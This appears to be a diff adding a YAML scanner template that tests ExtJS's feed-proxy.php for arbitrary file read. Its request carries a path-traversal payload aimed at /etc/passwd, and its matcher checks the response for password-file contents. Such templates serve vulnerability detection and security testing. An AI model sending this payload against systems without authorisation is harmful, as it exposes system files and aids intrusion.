@@ -1,0 +1,26 @@
+id: poc-yaml-extjs-arbitrary-file-read
+info:
+  name: ExtJS Arbitray File Read 漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: ExtJS
+  osprey-id: vb_2019_0088
+variables:
+  v_feed: 'http/../feed-viewer.css
+
+    http/../../../../../../../../../../../etc/passwd'
+requests:
+- method: GET
+  path: /extjs/examples/feed-viewer/feed-proxy.php?feed={{.v_feed}}
+  headers: {}
+  expression: 'status_code == 200 && (
+
+    contains(body, "root:") && !contains(body, "<") && contains(body, "/bin") ||
+
+    contains(body, ".ext-el-mask")
+
+    )
+
+    '
+transport: http
